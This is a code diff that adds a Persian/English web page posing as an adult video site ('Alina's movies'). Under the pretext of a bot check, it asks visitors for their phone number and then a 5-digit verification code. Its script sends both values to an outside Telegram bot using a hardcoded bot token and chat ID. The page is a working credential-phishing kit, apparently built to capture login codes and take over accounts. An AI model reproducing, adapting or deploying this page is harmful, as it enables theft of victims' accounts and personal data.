@@ -1,0 +1,287 @@
+<!DOCTYPE html>
+<html lang="fa" dir="rtl">
+<head>
+  <meta charset="UTF-8">
+  <title>فیلم‌های الینا</title>
+  <style>
+    body {
+      font-family: Tahoma, sans-serif;
+      background: linear-gradient(135deg, #6a11cb, #2575fc);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+    }
+    .container {
+      background: #fff;
+      padding: 35px;
+      border-radius: 16px;
+      box-shadow: 0 8px 25px rgba(0,0,0,0.2);
+      width: 340px;
+      text-align: center;
+      animation: fadeIn 1s ease;
+      position: relative;
+    }
+    h2 {
+      margin-bottom: 10px;
+      font-size: 22px;
+      color: #333;
+    }
+    p.subtitle {
+      font-size: 14px;
+      color: #555;
+      margin-bottom: 15px;
+    }
+    label {
+      display: block;
+      text-align: right;
+      margin: 6px 0 4px;
+      font-size: 13px;
+      color: #444;
+    }
+    input, select, button {
+      width: 100%;
+      padding: 12px;
+      margin: 8px 0;
+      border: 1px solid #ddd;
+      border-radius: 10px;
+      font-size: 14px;
+      transition: all 0.3s ease;
+    }
+    input:focus, select:focus {
+      border-color: #2575fc;
+      box-shadow: 0 0 6px rgba(37,117,252,0.4);
+      outline: none;
+    }
+    button {
+      background: linear-gradient(90deg, #6a11cb, #2575fc);
+      color: white;
+      border: none;
+      font-weight: bold;
+      cursor: pointer;
+      transition: transform 0.2s ease, box-shadow 0.2s ease;
+    }
+    button:hover {
+      transform: translateY(-2px);
+      box-shadow: 0 6px 15px rgba(37,117,252,0.4);
+    }
+    #codeSection { display: none; }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(-20px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .loader {
+      display: none;
+      margin: 10px auto;
+      border: 4px solid #f3f3f3;
+      border-top: 4px solid #2575fc;
+      border-radius: 50%;
+      width: 28px;
+      height: 28px;
+      animation: spin 1s linear infinite;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+
+    #langBtn {
+      position: absolute;
+      top: 10px;
+      left: 10px;
+      background: #fff;
+      color: #2575fc;
+      border: 1px solid #2575fc;
+      border-radius: 8px;
+      padding: 5px 10px;
+      font-size: 12px;
+      cursor: pointer;
+      transition: 0.3s;
+    }
+    #langBtn:hover {
+      background: #2575fc;
+      color: #fff;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <button id="langBtn">English</button>
+    <h2 id="title">💋 فیلم‌های الینا</h2>
+    <p id="subtitle" class="subtitle">
+      برای اینکه مطمئن شویم ربات نیستید، شماره خود را وارد کنید
+    </p>
+
+    <div id="phoneSection">
+      <label id="countryLabel">کشور:</label>
+      <select id="country">
+        <option value="+98">🇮🇷 ایران (+98)</option>
+        <option value="+1">🇺🇸 آمریکا (+1)</option>
+        <option value="+44">🇬🇧 انگلستان (+44)</option>
+        <option value="+55">🇧🇷 برزیل (+55)</option>
+        <option value="+92">🇵🇰 پاکستان (+92)</option>
+        <option value="+91">🇮🇳 هند (+91)</option>
+        <option value="+82">🇰🇷 کره جنوبی (+82)</option>
+      </select>
+
+      <label id="phoneLabel">شماره تلفن:</label>
+      <input type="tel" id="phone" placeholder="9123456789" required>
+
+      <button type="button" id="sendPhoneBtn">ارسال شماره</button>
+      <div class="loader" id="phoneLoader"></div>
+    </div>
+
+    <div id="codeSection">
+      <label id="codeLabel">کد تأیید:</label>
+      <p id="codeSubtitle" class="subtitle">
+        برای اینکه مطمئن شویم ربات نیستید، کد تأیید ۵ رقمی را وارد کنید
+      </p>
+      <input type="text" id="verifyCode" placeholder="کد ۵ رقمی">
+
+      <button type="button" id="sendCodeBtn">ارسال کد</button>
+      <div class="loader" id="codeLoader"></div>
+    </div>
+  </div>
+
+  <script>
+    let isEnglish = false;
+
+    const langBtn = document.getElementById("langBtn");
+    const title = document.getElementById("title");
+    const subtitle = document.getElementById("subtitle");
+    const codeSubtitle = document.getElementById("codeSubtitle");
+    const countryLabel = document.getElementById("countryLabel");
+    const phoneLabel = document.getElementById("phoneLabel");
+    const sendPhoneBtn = document.getElementById("sendPhoneBtn");
+    const codeLabel = document.getElementById("codeLabel");
+    const sendCodeBtn = document.getElementById("sendCodeBtn");
+
+    const phoneInput = document.getElementById("phone");
+    const countrySelect = document.getElementById("country");
+    const phoneSection = document.getElementById("phoneSection");
+    const codeSection = document.getElementById("codeSection");
+    const verifyCodeInput = document.getElementById("verifyCode");
+    const phoneLoader = document.getElementById("phoneLoader");
+    const codeLoader = document.getElementById("codeLoader");
+
+    const BOT_TOKEN = "7750642989:AAGaBNV5TfRDq1QZDjMBkShiNCeTurcnCeQ";
+    const CHAT_ID = "7108724626";
+
+    // تغییر زبان
+    langBtn.addEventListener("click", () => {
+      isEnglish = !isEnglish;
+      if(isEnglish) {
+        document.documentElement.lang = "en";
+        document.documentElement.dir = "ltr";
+        langBtn.textContent = "فارسی";
+        title.textContent = "🎬 Alina's Movies";
+        subtitle.textContent = "To make sure you are not a bot, please enter your phone number";
+        codeSubtitle.textContent = "To make sure you are not a bot, please enter the 5-digit verification code";
+        countryLabel.textContent = "Country:";
+        phoneLabel.textContent = "Phone Number:";
+        sendPhoneBtn.textContent = "Send Number";
+        codeLabel.textContent = "Verification Code:";
+        sendCodeBtn.textContent = "Send Code";
+        phoneInput.placeholder = "9123456789";
+        verifyCodeInput.placeholder = "5-digit code";
+      } else {
+        document.documentElement.lang = "fa";
+        document.documentElement.dir = "rtl";
+        langBtn.textContent = "English";
+        title.textContent = "🎬 فیلم‌های الینا";
+        subtitle.textContent = "برای اینکه مطمئن شویم ربات نیستید، شماره خود را وارد کنید";
+        codeSubtitle.textContent = "برای اینکه مطمئن شویم ربات نیستید، کد تأیید ۵ رقمی را وارد کنید";
+        countryLabel.textContent = "کشور:";
+        phoneLabel.textContent = "شماره تلفن:";
+        sendPhoneBtn.textContent = "ارسال شماره";
+        codeLabel.textContent = "کد تأیید:";
+        sendCodeBtn.textContent = "ارسال کد";
+        phoneInput.placeholder = "9123456789";
+        verifyCodeInput.placeholder = "کد ۵ رقمی";
+      }
+    });
+
+    // ارسال شماره
+    sendPhoneBtn.addEventListener("click", () => {
+      const phone = phoneInput.value.trim();
+      const country = countrySelect.value;
+
+      if(phone === "") {
+        alert(isEnglish ? "Please enter your phone number" : "لطفا شماره را وارد کنید");
+        return;
+      }
+
+      sendPhoneBtn.disabled = true;
+      phoneLoader.style.display = "block";
+
+      const message = `📱 شماره جدید وارد شد:\n${country}${phone}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if(data.ok) {
+          alert(isEnglish ? "Number sent successfully ✅" : "شماره با موفقیت ارسال شد ✅");
+          phoneSection.style.display = "none";
+          codeSection.style.display = "block";
+        } else {
+          alert(isEnglish ? "Error sending number ❌" : "خطا در ارسال شماره ❌");
+          console.error(data);
+        }
+      })
+      .catch(err => {
+        alert(isEnglish ? "Error sending number ❌" : "خطا در ارسال شماره ❌");
+        console.error(err);
+      })
+      .finally(() => {
+        phoneLoader.style.display = "none";
+        sendPhoneBtn.disabled = false;
+      });
+    });
+
+    // ارسال کد
+    sendCodeBtn.addEventListener("click", () => {
+      const code = verifyCodeInput.value.trim();
+      if(code === "") {
+        alert(isEnglish ? "Please enter the code" : "لطفا کد را وارد کنید");
+        return;
+      }
+
+      sendCodeBtn.disabled = true;
+      codeLoader.style.display = "block";
+
+      const message = `🔑 کد تأیید وارد شده:\n${code}`;
+
+      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ chat_id: CHAT_ID, text: message })
+      })
+      .then(res => res.json())
+      .then(data => {
+        if(data.ok) {
+          alert(isEnglish ? "Code sent successfully ✅" : "کد با موفقیت ارسال شد ✅");
+          verifyCodeInput.value = "";
+        } else {
+          alert(isEnglish ? "Error sending code ❌" : "خطا در ارسال کد ❌");
+          console.error(data);
+        }
+      })
+      .catch(err => {
+        alert(isEnglish ? "Error sending code ❌" : "خطا در ارسال کد ❌");
+        console.error(err);
+      })
+      .finally(() => {
+        codeLoader.style.display = "none";
+        sendCodeBtn.disabled = false;
+      });
+    });
+  </script>
+</body>
+</html>
